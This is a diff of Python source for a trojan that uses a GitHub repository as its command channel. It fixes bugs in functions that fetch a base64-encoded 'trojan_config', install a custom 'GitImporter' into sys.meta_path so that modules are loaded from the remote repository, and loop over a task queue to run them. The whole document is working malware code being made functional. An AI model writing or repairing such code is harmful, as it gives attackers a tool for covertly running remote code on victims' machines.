@@ -36,11 +36,12 @@ def get_file_contents(filepath):
             blob = repo.blob(filename._json_data['sha'])
             return blob.content
         
-        return None
+    return None
     
 def get_trojan_config():
     global configured
     config_json  = get_file_contents(trojan_config)
+    
     config       = json.loads(base64.b64decode(config_json))
     configured   = True
         
@@ -89,7 +90,8 @@ def module_runner(module):
     return
 
 #main
-sys.meta_path = [GitImporter]
+sys.meta_path = [GitImporter()]
+
 while True:
     if task_queue.empty():
         config      = get_trojan_config()
